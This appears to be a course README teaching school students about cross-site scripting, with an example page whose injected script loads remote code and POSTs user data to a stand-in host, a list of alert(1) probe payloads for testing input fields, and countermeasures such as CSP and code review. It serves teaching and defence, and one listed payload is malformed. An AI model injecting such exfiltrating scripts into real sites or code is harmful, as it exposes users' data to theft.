# Cross Site Scripting (XSS)

Cross-site scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

## Software Engineering Course Specifications

_"Cross-site scripting (XSS) involves injecting malicious code into an otherwise safe website. It is usually done through user input that is not sufficiently sanitised before being processed and stored on the server._  
_Students should be able to interpret fragments of JavaScript related to cross-site scripting."_

Either the malicious code was inserted into the code base because it was accidentally inserted without [code reviews](../security_testing_approaches/README.md#Code_review) or an internal threat actor has intentionally inserted it, or an SQL/XXS code injection vulnerability has been exploited to insert it. Students should be able to identify that an script referring to a foreign context has been executed or that a POST request has been made to an unknown URL.

```html
<HTML>
    <HEAD>
        <TITLE>Welcome to yourWebsite</TITLE>
        <link href="http://yourwebsite.com/favicon.png" />
    </HEAD>
    <BODY>
        <H1>Your Website</H1>
    <SCRIPT src="http://www.randomUrl.com/danger.js"></SCRIPT>

    or

    <SCRIPT>
        const response = fetch("http://www.randomUrl.com", {
            method: 'POST', 
            headers: {
            'Content-Type': 'application/json; charset=UTF-8',
            },
        body: JSON.stringify(yourData),
        });
    </SCRIPT>
    </BODY>
</HTML>
```

## How to penetrate test for this vulnerability

To use these scripts, paste them into any input boxes or after the URL in the browser address bar and see what gets executed or saved to the HTML.

- `<script>alert(1)</script>`
- `<img src=x onload(alert(1))>`
- `<svg onload=alert(1)>`
- `<iframe src=”javascript:alert(1)”></iframe>`

## How to countermeasure this vulnerability

1. Regular [code reviews](../security_testing_approaches/README.md#Code_review)
2. Only known and secure third-party libraries should be externally linked. Preferably, after a code review, third-party libraries should be locally served.
3. Monitor 3rd party libraries for known vulnerabilities and, on discovery, patch the vulnerabilities.
4. Implement [Defensive data handling](../defensive_data_handling/README.md).
5. Declare the language `<html lang="en">`.
6. Declare charset `<meta charset="utf-8">`.
7. Implement a [Content Security Policy (CSP)](../content_security_policy/README.md) Blocking `<SVG>` and `<SCRIPT>` tags.
